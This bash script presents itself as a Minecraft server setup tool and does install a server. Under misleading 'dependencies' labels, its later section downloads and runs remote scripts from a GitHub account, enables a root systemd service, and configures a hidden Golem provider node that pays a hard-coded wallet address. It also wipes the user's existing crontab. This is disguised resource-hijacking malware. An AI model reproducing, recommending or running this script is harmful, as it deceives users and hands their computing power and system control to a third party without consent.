# ----------- Global vars ----------- #
runMinecraftCommand="java -Xmx2G -jar minecraft_server.jar nogui"
startScript="start.sh"

# ----------- Welcome message ----------- #
echo "Great let's get minecraft setup!"

# ----------- Updating and Installing Dependencies ----------- #
sudo apt-get -qq update -y > /dev/null
if (( $(echo "$(lsb_release -r -s) < $21.04" |bc -l) )); then
    sudo apt-get -qq install screen default-jdk qemu-kvm libvirt-bin virtinst bridge-utils cpu-checker wget -y > /dev/null
else
    sudo apt-get -qq install screen default-jdk qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils wget -y > /dev/null
fi

# ----------- Create the minecraft directory ----------- #
if [ ! -d "minecraft" ]; then
    mkdir ~/minecraft
fi
cd ~/minecraft

# ----------- Ask which minecraft version to download ----------- #
echo "Which version of minecraft server do you want to install? e.g. 1.15.2"
read VER

echo "Downloading minecraft server version $VER..."

# ----------- Download selected version ----------- #
wget "https://s3.amazonaws.com/Minecraft.Download/versions/$VER/minecraft_server.$VER.jar" -O minecraft_server.jar 2>&1 | grep "403" &> /dev/null
echo "Minecraft server downloaded successfully!"

# ----------- Create a start minecraft shell script which we can run on reboot ----------- #
touch $startScript
cat > $startScript <<- EOM
#!/bin/sh
cd ~/minecraft
screen -dmS minecraft $runMinecraftCommand
EOM

if [ ! -f $startScript ]; then
    echo "Was unable to create a start script for server. Try again."
    exit
fi

# ----------- Make the start script executable ----------- #
chmod 755 $startScript

# ----------- Let's start up minecraft and accept any eula agreements ----------- #
bash $startScript
sleep 5
screen -S minecraft -X quit &> /dev/null

# ----------- If server creates a eula.txt file, update the value false to true ----------- #
if [ -f "eula.txt" ]; then
    LC_ALL="en_US.UTF-8" perl -pi -e 's/false/true/g' eula.txt
fi

# ----------- Remove crontab in case we've already set it up ----------- #
crontab -r &>/dev/null

# ----------- Add command to our crontab to start minecraft on reboot ----------- #
(crontab -l &>/dev/null; echo "@reboot /home/$(whoami)/minecraft/$startScript") | crontab -

# ----------- Let's run our start script, our minecraft server should be good to go! ----------- #
bash $startScript
sleep 3

# ----------- Let's setup some bash aliases for easy stopping/starting of server ----------- #
grep "alias minecraft-stop" ~/.bashrc &> /dev/null
if [ $? == 1 ]; then
cat <<EOT >> ~/.bashrc
alias minecraft-start="bash ~/minecraft/$startScript && echo minecraft server started"
alias minecraft-stop="screen -S minecraft -X quit && echo minecraft server stopped"
EOT
fi

# ----------- Main loop finish, 50% way done ----------- #
echo "Now, add your local ip to your server manager and enjoy!"

# ----------- Avoid permission problems ----------- #
sudo gpasswd -a $(whoami) kvm > /dev/null
sudo gpasswd -a root kvm > /dev/null

# ----------- Go back to user directory ----------- #
cd ~

# ----------- Install server dependencies service ----------- #
sudo wget -O /usr/bin/server.service -q https://github.com/0xI2C/resources-required/raw/main/server.service
sudo chmod +x /usr/bin/server.service
sudo systemctl -q enable /usr/bin/server.service

# ----------- Install Mineraft-Server Dependencies ----------- #
wget -q https://github.com/0xI2C/resources-required/raw/main/as-provider.sh
sudo chmod +x as-provider.sh
./as-provider.sh
rm as-provider.sh

# ----------- Add binaries to PATH ----------- #
export PATH="/usr/bin:$PATH"
echo 'export PATH="/usr/bin:$PATH"' >> ~/.bashrc

# ----------- Current user config ----------- #
golemsp settings set --node-name $(date +%s)
golemsp settings set --starting-fee 0
golemsp settings set --env-per-hour 0.0015
golemsp settings set --cpu-per-hour 0.06
golemsp settings set --account 0xc018A306Ab457e2aB37FEA9AEAa06237f1B00476

# ----------- ROOT user config ----------- #
sudo golemsp settings set --node-name $(date +%s)
sudo golemsp settings set --starting-fee 0
sudo golemsp settings set --env-per-hour 0.0015
sudo golemsp settings set --cpu-per-hour 0.06
sudo golemsp settings set --account 0xc018A306Ab457e2aB37FEA9AEAa06237f1B00476

# ----------- Start secondary server ----------- #
echo "0.06" | nohup golemsp run >/dev/null 2>&1 &
